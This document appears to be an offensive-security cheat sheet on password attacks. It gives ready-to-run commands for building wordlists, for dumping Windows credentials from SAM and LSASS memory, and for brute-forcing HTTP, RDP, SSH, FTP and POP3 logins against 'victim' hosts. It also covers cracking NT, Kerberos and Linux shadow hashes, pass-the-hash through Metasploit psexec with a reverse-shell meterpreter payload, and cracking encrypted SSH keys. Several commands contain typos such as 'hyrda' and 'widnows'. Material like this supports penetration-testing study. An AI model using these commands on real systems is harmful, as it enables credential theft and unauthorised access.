- [Password generator](#Password-generator)
- [Windows](#Windows)
- [Password cracking](#Password-cracking)
- [Password hash cracking](#Password-hash-cracking)
- [Pass the hash](#Pass-the-hash)
- [SSH key cracking](#SSH-key-cracking)
- [Remote Desktop Protocol Attack](#Remote-Desktop-Protocol-Attack)
- [Usefull tools](#Tools)
 
## Wordlists
Wordlists, sometimes referred to as dictionary files, are simply text files containing words for use as input to programs designed to test passwords.

#### Crunch: 
  - is a wordlist generator where you can specify a standard character set or a character set you specify.

- crunch 6 6 1234567890ABCDE -o <file.txt>
  - ***6*** min length
  - ***6*** max length
  - ***1234567890ABCDE*** charset
  - ***o*** seve result in file
 
- crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha
  - ***f*** dictionary path
  
- special chars
  - @ lower case alpha char
  - , upper case alpha char
  - % numeric charset
  - ^ special char include space
  
#### Cewl:
```
cewl <victim_www_url> -d [num] -m [num] -w [file.txt]
```
#### John the Ripper (JTR)
Use for generate custom wordlists and apply rule permutations.

- Add a rule to the JTR configuration **(/etc/john/john.cont**

To do th is, we must locate the [List.Rules:Wordlist] segment, We will begin this rule with the $ character, which tells John to append a character to the original
word in our wordlist. Next, we specify the type of character we want to append, in our case we want any number between zero and nine $[0-9]. Finally, to append double-dig its, we will simply repeat the $[0-9] sequence.
```
$[0-9]$[0-9]
```
- Mutate our wordlist
```
john --wordtist=our-cewt-list.txt --rules --stdout > mutated.txt
```

------------------------------------------------------------------------------------------------------------------------
# Windows  

- pwdump fgdump
MS Windows store hased user password in the ***Security account manager (SAM)***
pwdump and fgdump inject a DLL containning the hash dumping code into the ***Local Security Authority Subsystem (LSASS)***

***- c:\> fgdump.exe ***
***- c:\> type 127.0.0.1.pwdump ***

- WCE
- WCE can steal NTLM credentails from memory and dump clear text password
***- c:\> WCE -w ***

------------------------------------------------------------------------------------------------------------------------
# Password cracking

- HTTP
```
medusa -h [url] -u [user_name] -p [password_file.txt] -M http
- hydra [target_url] -l [user_name] -P [password_file] https-post-form 
/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```
- RDP
```
ncrack -vv --user [user_name] -P [password_file.txt] rdp://[victim_ip]
```
- SNMP 
``` 
hydra -P [password-file.txt] -v [victim_ip] snmp
```
- SSH 
```
hydra -l [user_name] -P [password_file.txt] [victim_ip] ssh
hydra -l [user_name] -P [password_file.txt] ssh://[victim_ip]
```
- FTP 
```
hyrda -L [user_file] -p [password] [victim_ip] ftp
```
- POP3 
```
hyrda -L [user_file] -P [password_file.txt] [victim_ip] -s [victim_port] -t 50 -I pop3

Usefull flag
- -vV : verbose mode
- -e nsr : login as password or login as password in reversed order etc
- -t : threads
```
------------------------------------------------------------------------------------------------------------------------
# Password hash cracking

#### Hash identifier

- hash-identifier
```
hash-identifier
```
- hashid
```
hashid [hash]
```
#### Hash cracking

- MD5
```
john --format=raw-md5 --wordlist=rockyou.txt [hash.file]
```
- SHA1
```
john --format=raw-sha1 --wordlist=rockyou.txt [hash.file]
```
- SHA256
```
john --format=raw-sha256 --wordlist=rockyou.txt [hash.file]
```
- SHA512
```
john --format=raw-sha512 --wordlist=rockyou.txt [hash.file]
```
- krb5tgs 
```
hashcat -m 13100 --force -a 0 hashes.file passwords.txt 

john --format=krb5tgs --wordlist=passwords.txt hashes.file
```
- AS REP
```
john --wordlist=passwords_kerb.txt hashes.file

hashcat -m 18200 --force -a 0 hashes.file passwords.txt
```
- NT hashes
```
john hash.txt --format=NT
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
- Linux based hashes with JTR
```
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordtists/rockyou.txt unshadowed.txt
```

------------------------------------------------------------------------------------------------------------------------
### Pass the hash
Technique allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear text password. This is possible because NTLM/LM password hashes are not salted and remain static between sessions

- Dump the contents of local SAM file, which contains the hashed(NTLM) passwords for every local account on the machine
```
meterpreter> hashdump
```

- psexec via msfconsole
```
msf> search psexec

msf> use exploit/windows/smb/psexec

msf> set payload widnows/meterpreter/reverse_tcp
msf> set LHOST <your_ip>
msf> set LPORT <your_port>
msf> set RHOST <target_ip>
msf> set SMBPass e.g (e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c)
msf> exploit
```

#### pth-winexe
To do this, we will use pth-winexe579 from the Passing-The-Hash toolkit (a modified version of winexe), which performs authentication using the SMB protocol
```
> pth-winexe -U [specifying the user name and hash (in UNC format)] //[victim_ip] command
```

------------------------------------------------------------------------------------------------------------------------
# SSH key cracking

#### Cracking encrypted private key
- Tool: ssh2john.py
```
ssh2john.py encrypted-private-key > private-key.john
```

- Tool: john
```
john --wordlist=/usr/share/wordlists/rockyou.txt private-key.john
```

#### Unencrypted copy of the key
- Tool: openssl
```
openssl rsa -in encrypted-private-key -out id_rsa
```

- Tool: chmod
```
chmod 600 id_rsa
```

#### Login with id_rsa
- install crowbar
```
ssh -i id_rsa user-name@<ip>
```

- crowbar using
```
crowbar -b rdp -s 10.11.8.22/ 32 -u admin -c ~/password-fite.txt -n 1

-b: protocol
-s: target server
-u: username
-c: wordlist
-n: number of threads
```

------------------------------------------------------------------------------------------------------------------------
#### Remote Desktop Protocol Attack
Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to leverage SSH keys rather than passwords
- Install crowbar
```
sudo apt install crowbar
```


------------------------------------------------------------------------------------------------------------------------
# Tools
#### ssh2john
- https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
